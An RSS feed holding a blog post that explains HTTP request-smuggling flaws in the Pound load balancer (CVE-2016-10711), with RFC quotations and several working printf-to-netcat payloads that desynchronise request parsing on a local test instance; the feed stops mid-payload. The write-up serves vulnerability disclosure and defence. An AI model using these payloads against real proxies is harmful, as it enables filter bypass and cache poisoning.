<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
	<channel>
		<title>RBleug</title>
		<description>Regilero's blog; Mostly tech things about web stuff.</description>
		<link>http://regilero.github.io</link>
		
			<item>
				<title>Security: HTTP Smuggling, Apsis Pound load balancer</title>
				<description>&lt;p&gt;&lt;small&gt;&lt;strong&gt;English version&lt;/strong&gt; (&lt;strong&gt;Version Française&lt;/strong&gt; disponible sur &lt;a href=&quot;https://www.makina-corpus.com/blog/metier/2018/contrebande-de-http-smuggling-load-balancer-apsis-pound&quot;&gt;makina corpus&lt;/a&gt;).&lt;/small&gt;
&lt;small&gt;estimated read time: 15min&lt;/small&gt;&lt;/p&gt;

&lt;h2&gt;Pound?&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;http://www.apsis.ch/pound/&quot;&gt;Pound&lt;/a&gt; is an Open Source HTTP load balancer, usually used as an SSL/TLS terminator
(handling https and certificate in front of a more classical http backend).
Back in time it was a simple and efficient way of adding SSL for a website.&lt;/p&gt;

&lt;p&gt;If you check &lt;a href=&quot;http://www.apsis.ch/pound/&quot;&gt;the official website&lt;/a&gt; you'll see pound decribed as a load balancer, a reverse proxy, an SSL wrapper but also a &lt;strong&gt;sanitizer&lt;/strong&gt;:&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;an HTTP/HTTPS sanitizer: Pound will verify requests for correctness and accept only well-formed ones.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;The project activity has been slowing down and this last CVE published in early 2018
may have triggered some warnings about the project activity.
The Debian project removed the package, not only because of that CVE, where &lt;a href=&quot;https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=888786&quot;&gt;a patch was available&lt;/a&gt;,
from &lt;a href=&quot;https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=891248&quot;&gt;this discussion&lt;/a&gt; it appears that compatibility with new versions of
openSSL and the lack of activity on the project contributed greatly to the decision.&lt;/p&gt;

&lt;h2&gt; Fixed versions of Pound&lt;/h2&gt;

&lt;p&gt;If we check the &lt;a href=&quot;https://tracker.debian.org/pkg/pound&quot;&gt;Debian status page&lt;/a&gt; for this package today (2018-07-03) we have a warning that the package has been removed because it cannot be find in any development repository, and 3 actions : outdated version, 1 ignored security issue in stretch (stable) and one in jessie (oldstable).
From my own test I cannot install it on jessie, but on stretch I'm still able to install it, with the security issues inside.&lt;/p&gt;

&lt;p&gt;If you use a Suse package you have the &lt;a href=&quot;https://lists.opensuse.org/opensuse-updates/2018-02/msg00024.html&quot;&gt;security updates&lt;/a&gt; available.&lt;/p&gt;

&lt;p&gt;On the &lt;a href=&quot;http://www.apsis.ch/pound/&quot;&gt;official project page&lt;/a&gt; the officiel stable version is now Pound-2.8 and contains the fix.
The first fixed version was 2.8a (experimental), and there was a very long time for which only this experimental version was available.&lt;/p&gt;

&lt;p&gt;The source code diff for version 2.8 is not very big: (&lt;a href=&quot;https://fossies.org/diffs/Pound/2.7_vs_2.8/http.c-diff.html&quot;&gt;fossies1&lt;/a&gt; | &lt;a href=&quot;https://fossies.org/diffs/Pound/2.7_vs_2.8/http.c-diff.html&quot;&gt;fossies2&lt;/a&gt;  | &lt;a href=&quot;https://fossies.org/diffs/Pound/2.7_vs_2.8/config.c-diff.html&quot;&gt;fossies3&lt;/a&gt;).
It contains some feature removal (dynamic scaling) and security syntax filters on HTTP Smuggling issues.
That's the interesting part.&lt;/p&gt;

&lt;h2&gt;CVE-2016-10711&lt;/h2&gt;

&lt;p&gt;The &lt;a href=&quot;https://www.cvedetails.com/cve/CVE-2016-10711/&quot;&gt;official CVE description&lt;/a&gt; is:&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;Apsis Pound before 2.8a allows request smuggling via crafted headers&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Most of the issues are in fact &lt;strong&gt;very common mistakes&lt;/strong&gt; with HTTP parsers (with
some specific rare issues also, like NULL character handling). Or I should say
it &lt;strong&gt;was common&lt;/strong&gt; before 2005 and before &lt;a href=&quot;https://tools.ietf.org/html/rfc7230&quot;&gt;RFC 7230&lt;/a&gt;. In the past years
I have reported similar issues in a lot of projects, small ones, and sometimes
bigger ones, so it could be interesting to study some of these &lt;em&gt;'crafted headers'&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Note that, as explained later, Pound, being an SSl terminator, is not the most
critical piece in a smuggling attack. Performing such attacks on a reverse proxy
cache, or a common HTTP server, is more valuable for an attacker. But the whole
'HTTP Smuggling attacks' paradigm is based on chaining syntax errors on multiple
actors, so everyone should detect the strange &lt;em&gt;crafted headers&lt;/em&gt; and behave properly.&lt;/p&gt;

&lt;h3&gt;1- Double content-length support:&lt;/h3&gt;

&lt;p&gt;Any request with 2 &lt;code&gt;Content-Length&lt;/code&gt; headers &lt;strong&gt;MUST&lt;/strong&gt; be rejected.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://tools.ietf.org/html/rfc7230#section-3.3.2&quot;&gt;RFC7230 section 3.3.2&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;If a message is received that has multiple Content-Length header
fields with field-values consisting of the same decimal value, or a
single Content-Length header field with a field value containing a
list of identical decimal values (e.g., &quot;Content-Length: 42, 42&quot;),
indicating that duplicate Content-Length header fields have been
generated or combined by an upstream message processor, then the
recipient MUST either reject the message as invalid or replace the
duplicated field-values with a single valid Content-Length field
containing that decimal value prior to determining the message body
length or forwarding the message.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&quot;https://tools.ietf.org/html/rfc7230#section-3.3.3&quot;&gt;RFC7230 section 3.3.3&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;If a message is received without Transfer-Encoding and with
either multiple Content-Length header fields having differing
field-values or a single Content-Length header field having an
invalid value, then the message framing is invalid and the
recipient MUST treat it as an unrecoverable error.  If this is a
request message, the server MUST respond with a 400 (Bad Request)
status code and then close the connection.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;For Pound, If you send a request with:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Content-Length: 0
Content-Length: 147
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Result is &lt;code&gt;Size of Body = 0&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;If you send one with:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Content-Length: 147
Content-Length: 0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Result is &lt;code&gt;Size of Body = 147&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The only official result should be &lt;strong&gt;an error&lt;/strong&gt;. If a previous actor in the HTTP
communication contains the same flaw, but inverted, You have an easy smuggling factor.
We will see below some example of HTTP pipelines exploits, the goal is usually
to have a size which differs, one actor is seing 3 requests, another actor thinks
there's only 2.&lt;/p&gt;

&lt;h3&gt;2) Chunks priority on Content-Length&lt;/h3&gt;

&lt;p&gt;Here we have again the &lt;a href=&quot;https://tools.ietf.org/html/rfc7230#section-3.3.3&quot;&gt;RFC7230 section 3.3.3&lt;/a&gt;, but another point:&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;If a message is received with both a Transfer-Encoding and a
Content-Length header field, the Transfer-Encoding overrides the
Content-Length. Such a message might indicate an attempt to
perform request smuggling (Section 9.5) or response splitting
(Section 9.4) and ought to be handled as an error.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;So the rule is that you can reject the message (this is now the case in
most servers), but at least, if you do not reject the message the
chunked transmission has the priority on any Content-Length headers.&lt;/p&gt;

&lt;p&gt;With Pound the rule was the first header read has the priority. Bad.&lt;/p&gt;

&lt;p&gt;Let's see an example. Here I have Pound Server listening on HTTP port 8080 on 127.0.0.1. (So without HTTPS support, but believe me in HTTPS mode all the attacks works the same, you can even use openssl_client instead of netcat to push some printf output on it). Behind that Pound talks to an HTTP server (the backend), on any other port.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;I use &lt;code&gt;printf&lt;/code&gt; to render my HTTP queries, I do not use curl or wget, because I want full control on all characters.&lt;/li&gt;
&lt;li&gt;I &lt;strong&gt;chain all the queries&lt;/strong&gt; in one single string, I do not wait for responses between each queries, that's called an &lt;strong&gt;HTTP pipeline&lt;/strong&gt;, without pipelining support on the server (here Pound) I cannot do anything&lt;/li&gt;
&lt;li&gt;I send this string (of HTTP queries) to netcat (command &lt;code&gt;nc&lt;/code&gt;) which is a very low level command which simply controls the tcp/ip connection to the targeted IP and port.&lt;/li&gt;
&lt;li&gt;this is the same as sending an HTTP query with a browser or with curl, but I have full control on nasty crafted headers&lt;/li&gt;
&lt;li&gt;the attacker goal is to send messages that could contain a different number of queries if it is read by a valid parser or an invalid one, that's the &lt;strong&gt;technical goal&lt;/strong&gt;. The functionnal goal of this is security filter bypass or cache poisoning, or some more complex stuff, but like an &lt;code&gt;alert()&lt;/code&gt; for XSS, which is just a technical proff and not a functionnal attack, if you have the wrong number of valid responses, there's a security issue.&lt;/li&gt;
&lt;li&gt;If you try it on a test environment you should track the requests sent by Pound on your backend, use Wireshark for example. Each request of the pipeline will be send individually to the backend, not in a pipeline.&lt;/li&gt;
&lt;/ul&gt;


&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# 2 responses instead of 3&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Content-length:56\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Transfer-Encoding: chunked\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;0\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /tmp HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /tests HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc -q3 127.0.0.1 8080&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;For a &lt;strong&gt;valid parser&lt;/strong&gt; there are 3 queries:&lt;/p&gt;

&lt;p&gt;First one:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;GET / HTTP/1.1[CRLF]
Host:localhost[CRLF]
**Content-length:56[CRLF]** (ignored and usually not send back to the backend)
Transfer-Encoding: chunked[CRLF]
Dummy:Header[CRLF]
[CRLF]
0[CRLF]  (end of chunks -&amp;gt; end of message)
[CRLF]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Second one:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;GET /tmp HTTP/1.1[CRLF]
Host:localhost[CRLF]
Dummy:Header[CRLF]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And third one:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;GET /tests HTTP/1.1[CRLF]
Host:localhost[CRLF]
Dummy:Header[CRLF]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;For an &lt;strong&gt;invalid parser&lt;/strong&gt; (here Pound) there's only 2 queries and the first one is:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;GET / HTTP/1.1[CRLF]
Host:localhost[CRLF]
Content-length:56[CRLF]
**Transfer-Encoding: chunked[CRLF]** (ignored and removed, hopefully)
Dummy:Header[CRLF]
[CRLF]
0[CRLF]  (start of 56 bytes of body)
[CRLF]
GET /tmp HTTP/1.1[CRLF]
Host:localhost[CRLF]
Dummy:Header[CRLF] (end of 56 bytes of body, not parsed)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3&gt;3) Bad chunked transmission&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://tools.ietf.org/html/rfc7230#section-3.3.3&quot;&gt;RFC7230 section 3.3.3&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;If a Transfer-Encoding header field
is present in a request and the chunked transfer coding is not
the final encoding, the message body length cannot be determined
reliably; the server MUST respond with the 400 (Bad Request)
status code and then close the connection.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Using &lt;code&gt;Transfer-Encoding: chunked, zorg&lt;/code&gt; we did not have the error 400.&lt;/p&gt;

&lt;h3&gt;4) NULL in headers -&gt; concatenation&lt;/h3&gt;

&lt;p&gt;That's an original issue, a rare one (but the NULL character is always fun to test).&lt;/p&gt;

&lt;p&gt;Like most HTTP servers Pound is written in C, and C string ends with the NULL character (&lt;code&gt;\0&lt;/code&gt;).
Finding a NULL character in an HTTP request (not the body part) should render an error,
but sometimes the parser does not detect the NULL character because the parsed line was wrongly interpreted as a C string.&lt;/p&gt;

&lt;p&gt;With Pound as soon as a NULL character was encountered in an header line the parser would continue the header with the next line.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# 2 responses instead of 3 (2nd query is wipped out by pound, used as a body)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Content-\0dummy: foo\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;length: 56\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Transfer-Encoding: chunked\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;0\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /tmp HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /tests HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc -q3 127.0.0.1 8080&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Here is another variation using the Double Content-length Support. This could be
used if the previous actor in the chain of proxies had no support for double
Content-Length (very likely).. but had support for NULL characters (less likely).&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# 2 responses instead of 3 (2nd query is wipped out by pound, used as a body)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Content-\0dummy: foo\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;length: 51\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Content-length: 0\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /tmp HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /tests HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc -q3 127.0.0.1 8080&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;On each attack we 2 responses instead of 3, you can also make 3 responses instead of 2.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# 3 responses instead of 2 (2nd query is unmasked by pound)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Transfer-\0Mode: magic\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Encoding: chunked\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Content-length: 57\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;0\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /tmp/ HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /tests HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc -q3 127.0.0.1 8080&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And if you are still here you can compare the last two examples.
On the first one we try a bad chunked transmission, and on the last one we use the &lt;code&gt;ops-fold&lt;/code&gt; syntax.
Use wireshark to compare the behaviors and some potential &lt;em&gt;crafted headers&lt;/em&gt; syntax transmitted to backends.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# chunk mode not applied&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Transfer-\0Mode: magic\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Encoding: chunked,zorg\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Content-length: 57\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;0\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /tmp/ HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /tests HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc -q3 127.0.0.1 8080&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;




&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# chunk mode applied, and &amp;#39;\r\n zorg\r\n&amp;#39; ops-fold transmitted&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Transfer-\0Mode: magic\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&amp;#39;Encoding: chunked\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
